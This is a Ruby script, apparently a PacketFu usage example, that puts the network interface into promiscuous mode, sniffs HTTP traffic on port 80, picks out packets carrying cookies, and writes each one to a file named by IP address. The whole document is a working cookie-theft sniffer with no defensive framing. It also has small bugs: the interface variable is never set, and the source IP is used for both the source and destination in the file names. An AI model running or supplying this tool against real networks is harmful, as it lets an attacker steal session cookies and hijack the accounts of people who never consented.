#!/usr/bin/ruby
require 'rubygems'
require 'packetfu'
include PacketFu

# Simple example that will sniff packets from the default NIC and capture 
# cookie-bearing packets, and dump them to a file.

# File output?
if ARGV[0] =~ /[vV]/ then
  @verbose = true
end

# dump the cookies to a file in verbose mode 
def puts_verbose(text, src_ip, dst_ip)
  if @verbose then
    
    #generate the filename
    user = File.open("cookie_#{src_ip}->#{dst_ip}.txt", "a") 
    puts "File opened: #{user.path}"
    user.puts "----------------------------------------------------"
    user.puts(text)
    user.close
  end
end

puts "Waiting for cookies............:"

begin
  iface = @interface
  capture_session = PacketFu::Capture.new(:iface => iface, :start => true, :promisc => true,
	:filter => "tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)")

  capture_session.stream.each { |packet|
    if packet =~ /ookie/
      puts "cookie found!" 
      pkt = Packet.parse packet
      packet_info = [pkt.ip_saddr, pkt.ip_daddr]
      src_ip = "%s" % packet_info
      dst_ip = "%s" % packet_info
      puts_verbose(packet, src_ip, dst_ip)
    end
  }
  # ^C to stop sniffing
  rescue Interrupt
  puts "\nPacket Capture stopped by interrupt signal."
  exit 0
end
